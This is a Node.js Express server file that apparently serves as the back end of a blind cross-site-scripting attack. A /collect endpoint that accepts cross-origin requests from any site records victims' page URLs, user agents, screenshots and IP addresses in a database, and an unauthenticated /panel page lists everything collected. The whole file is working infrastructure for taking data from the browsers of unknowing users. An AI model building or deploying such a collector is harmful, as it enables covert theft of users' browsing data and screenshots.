const express = require('express');
const cors = require('cors');
const path = require('path');
const db = require('./db');

const app = express();
app.use(cors());
app.use(express.json());
app.set('view engine', 'ejs');
app.set('views', path.join(__dirname, 'views'));
app.use('/js', express.static(path.join(__dirname, 'public/js')));

// In-memory payload store
const payloads = [];

// Payload receiver
app.post('/collect', (req, res) => {
  const { url, userAgent, ua, screenshot } = req.body;
  const ip = req.ip;
  const time = new Date().toISOString();

  db.run(`
    INSERT INTO payloads (url, userAgent, screenshot, ip, time)
    VALUES (?, ?, ?, ?, ?)
  `, [url, userAgent || ua, screenshot || null, ip, time]);

  res.sendStatus(200);
});

// Admin panel route
app.get('/panel', (req, res) => {
  db.all('SELECT * FROM payloads ORDER BY id DESC', [], (err, rows) => {
    if (err) {
      return res.status(500).send('Database error');
    }
    res.render('panel', { payloads: rows });
  });
});


const PORT = 4000;
app.listen(PORT, () => console.log(`Listening on http://localhost:${PORT}/panel`));
